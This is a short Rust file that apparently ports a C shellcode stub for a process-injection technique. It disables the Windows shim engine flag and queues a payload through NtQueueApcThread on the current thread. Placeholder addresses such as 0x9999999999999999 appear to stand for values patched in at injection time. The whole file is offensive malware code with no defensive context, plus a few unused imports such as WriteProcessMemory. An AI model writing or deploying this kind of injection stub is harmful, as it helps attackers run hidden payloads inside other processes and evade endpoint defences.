use winapi::ctypes::c_void;
use winapi::shared::ntdef::HANDLE;
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::processthreadsapi::{QueueUserAPC, PROCESS_INFORMATION};
use ntapi::ntpsapi::NtTestAlert;

// Add this function near the top of your file, after the imports
fn wide_string(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Define our own version of NtCurrentThread()
const NT_CURRENT_THREAD: HANDLE = -2isize as HANDLE;

// Update the type definition to match the C version
type NtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: *const c_void,
    ApcArgument1: *const c_void,
    ApcArgument2: *const c_void,
    ApcArgument3: *const c_void,
) -> i32;

fn main() {
    // Define our hardcoded addresses like the C version
    let g_shims_enabled: *mut u8 = 0x9999999999999999 as *mut u8;
    let mm_payload: *const c_void = 0x8888888888888888 as *const c_void;
    let mm_context: *const c_void = 0x7777777777777777 as *const c_void;
    
    // Disable shim engine
    unsafe {
        *g_shims_enabled = 0;
    }

    // Queue APC using the function pointer approach like the C version
    let nt_queue_apc_thread: NtQueueApcThread = unsafe {
        std::mem::transmute(0x6666666666666666u64)
    };

    unsafe {
        nt_queue_apc_thread(
            NT_CURRENT_THREAD,
            mm_payload,
            mm_context,
            std::ptr::null(),
            std::ptr::null(),
        );
    }
}
